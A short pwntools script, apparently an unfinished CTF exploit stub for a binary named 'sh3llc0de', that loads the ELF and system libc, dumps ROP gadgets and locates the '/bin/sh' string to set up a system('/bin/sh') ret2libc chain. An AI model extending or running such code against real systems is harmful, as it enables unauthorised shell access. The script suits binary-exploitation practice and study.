from pwn import *

elf = ELF('./sh3llc0de')
rop = ROP(elf)
#libc = ELF('libc-2.23.so')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# rop.puts(elf.got['system'])
# rop.call(elf.symbols['atoi'])
print rop.dump()
# Create new ROP object with rebased libc
rop2 = ROP(libc)

# Call system('/bin/sh')
print "bin_sh Offset:",next(libc.search('/bin/sh\x00'))
log.info("bin_sh:"+str(libc.search('/bin/sh\x00')))
log.info("ROP 2:")
print rop2.dump()

